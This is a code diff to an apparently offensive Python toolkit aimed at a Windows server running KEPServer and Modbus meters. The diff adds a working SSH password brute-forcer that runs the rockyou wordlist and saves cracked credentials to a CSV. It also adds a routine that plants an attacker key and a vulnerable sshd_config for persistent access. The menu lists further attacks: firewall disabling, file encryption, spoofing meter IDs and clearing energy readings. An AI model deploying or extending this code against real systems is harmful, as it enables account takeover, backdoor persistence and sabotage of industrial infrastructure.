@@ -34,6 +34,13 @@ class AttackScript:
         self.PASSWORD = password
         self.WINDOWS_SERVER_IP = ip
 
+        # Set the path for the password brute force file
+        self.PASSWORD_FILE = "resources\\rockyou.txt"
+
+        # Set the path for vulnerable sshd_config file and the access key
+        self.SSHD_CONFIG_PATH="resources\\vuln_sshd_config"
+        self.ACCESS_KEY_PATH="resources\\accessKey.pub"
+
         # Set the path for the private SSH key
         self.PRIVATE_KEY_PATH = "resources\\accessKey"
 
@@ -92,11 +99,11 @@ class AttackScript:
 
         try:
             # Connect to the remote server, prioritizing private key over password
-            # if self.PRIVATE_KEY_PATH is not None:
-            #     # Note that Ed25519 was used for the generation. If it is RSA, use "paramiko.RSAKey.from_private_key_file()" instead
-            #     private_key = paramiko.Ed25519Key.from_private_key_file(self.PRIVATE_KEY_PATH)
-            #     # Connect using the private key
-            #     ssh.connect(self.WINDOWS_SERVER_IP, username=self.USERNAME, pkey=private_key)
+            if self.PRIVATE_KEY_PATH is not None:
+                # Note that Ed25519 was used for the generation. If it is RSA, use "paramiko.RSAKey.from_private_key_file()" instead
+                private_key = paramiko.Ed25519Key.from_private_key_file(self.PRIVATE_KEY_PATH)
+                # Connect using the private key
+                ssh.connect(self.WINDOWS_SERVER_IP, username=self.USERNAME, pkey=private_key)
             if self.PASSWORD is not None:
                 # Connect using password
                 ssh.connect(self.WINDOWS_SERVER_IP, username=self.USERNAME, password=self.PASSWORD)
@@ -1241,6 +1248,131 @@ class AttackScript:
     
     def progress4(self, filename, size, sent, peername):
         sys.stdout.write("(%s:%s) %s's progress: %.2f%%   \r" % (peername[0], peername[1], filename, float(sent)/float(size)*100) )
+
+    def ssh_brute_force(self) -> bool:
+        """
+        Attempts to brute force an SSH connection given a hostname, port, username, and password list file.
+
+        Args:
+            hostname (str): The hostname or IP address of the SSH server.
+            username (str): The username to use for the SSH connection.
+            password_file (str): The path to the password list file.
+
+        Returns:
+            bool: True if the SSH connection was successful, False otherwise.
+        """
+
+        # Create an SSH client using the Paramiko library
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+        # Read from the password list file and save it to a list
+        passwordList = []
+        with open(self.PASSWORD_FILE, "r") as f:
+            for line in f.readlines():
+                passwordList.append(line.strip())
+
+        # Attempt to connect to the SSH server using the username and password list
+        for password in passwordList:
+            try:
+                ssh.connect(self.WINDOWS_SERVER_IP, username=self.USERNAME, password=password)
+                # If the connection was successful, print the valid credentials
+                print(f"[*] Found valid credentials - Username: {self.USERNAME}, Password: {password}")
+
+                # Write the valid credentials to credentials.csv
+                # If the file does not exist, create it and write the header
+                try:
+                    with open("resources\\credentials.csv", "x") as f:
+                        f.write("username,password")
+                except FileExistsError:
+                    pass
+
+                with open("resources\\credentials.csv", "a") as f:
+                    f.write(f"\n{self.USERNAME},{password}")
+                    print("[*] Wrote valid credentials to credentials.csv")
+                
+                # Close the SSH connection
+                ssh.close()
+                return True
+            except paramiko.AuthenticationException:
+                print(f"[-] Invalid credentials - Username: {self.USERNAME}, Password: {password}")
+            except paramiko.SSHException as e:
+                print(f"[-] Unable to establish SSH connection: {e}")
+                sys.exit(1)
+            except paramiko.ssh_exception.NoValidConnectionsError as e:
+                print(f"[-] Unable to connect to the SSH server: {e}")
+                sys.exit(1)
+            except Exception as e:
+                print(f"[-] Error: {e}")
+                sys.exit(1)
+        
+        print("[!] Exhausted password list. Unable to find valid credentials.")
+        ssh.close()
+        return False
+    
+    def setup_ssh_config_and_key(self) -> bool:
+        """
+        Inserts an sshd_config file and an access key into a target Windows machine. Once complete, the SSH service (sshd) is restarted.
+        After running, you will then be able to use the access key to SSH into the target machine.
+
+        Args:
+            hostname (str): The hostname or IP address of the target Windows machine.
+            sshd_config_path (str): The path to the sshd_config file.
+            access_key_path (str): The path to the access key file.
+
+        Returns:
+            bool: True if the SSH connection was successful, False otherwise.
+        """
+
+         # Create SSH client
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+        try:
+            # Connect to the target Windows machine
+            ssh.connect(self.WINDOWS_SERVER_IP, username=self.USERNAME, password=self.PASSWORD)
+
+            # Create SCP client
+            scp = SCPClient(ssh.get_transport())
+
+            # Copy sshd_config to the target machine using SCP
+            scp.put(self.SSHD_CONFIG_PATH, remote_path='C:/ProgramData/ssh/sshd_config')
+
+            # Copy the access key to the target machine using SCP
+            scp.put(self.ACCESS_KEY_PATH, remote_path=f'C:/Users/{self.USERNAME}/.ssh/authorized_keys')
+
+            # Close the SCP and SSH clients
+            scp.close()
+
+            # Set access rule protection and permissions on authorized_keys file using pwsh.exe
+            acl_cmd = f'pwsh.exe -Command "$acl = Get-Acl \'C:\\Users\\{self.USERNAME}\\.ssh\\authorized_keys\'; $acl.SetAccessRuleProtection($true, $false); $administratorsRule = New-Object System.Security.AccessControl.FileSystemAccessRule(\'Administrators\',\'FullControl\',\'Allow\'); $systemRule = New-Object System.Security.AccessControl.FileSystemAccessRule(\'SYSTEM\',\'FullControl\',\'Allow\'); $acl.SetAccessRule($administratorsRule); $acl.SetAccessRule($systemRule); $acl | Set-Acl"'
+
+            ssh.exec_command(acl_cmd)
+
+            # Restart the SSH service (sshd) using pwsh.exe
+            ssh.exec_command('pwsh.exe -Command "Restart-Service sshd"')
+
+            # Close the SSH connection
+            ssh.close()
+            
+            print("Successfully inserted sshd_config and authorized_keys.")
+
+            # Cleanup and return True
+            ssh.close()
+            return True
+        
+        except paramiko.AuthenticationException:
+            print("Failed to authenticate to the target machine.")
+        except paramiko.SSHException as e:
+            print(f"An SSH error occurred: {e}")
+        except Exception as e:
+            print(f"An error occurred: {e}")
+
+        # Cleanup and return False
+        ssh.close()
+        return False
+
+
     ########
     # MAIN #
     ########
@@ -1279,6 +1411,8 @@ class AttackScript:
             case "23": self.kep_get_single_device()
             case "24": self.kep_delete_spoofed_device()
             case "25": self.kep_add_spoofed_device()
+            case "26": self.ssh_brute_force() # Move this up to be with the other ssh functions
+            case "27": self.setup_ssh_config_and_key() # Move this up to be with the other ssh functions
             case "-h":
                 print("\nChoose \n1 Delete file, \n2 Copy file, \n3 Disable firewall, \n4 Disable ssh through firewall, \n5 Disable Kepserver, \n6 Interrupt modbus reading, \n7 Disable COMPORT, \n8 Encrypt files, \n9 Change Meter25 Id to 26, \n10 Clear Energy Reading, \n11 Revert with options, \n12 Bruteforce KEPServer Password, \n13 Disable sshd Service, \n14 Get hardware info, \n15 Obtain KEPServer info, \n16 Get all KEPServer Users, \n17 Enable KEP Users, \n18 Disable KEP Users, \n19 Obtain KEP User Info.")
             case _: print("Invalid Option! Use option \"-h\" for help!")
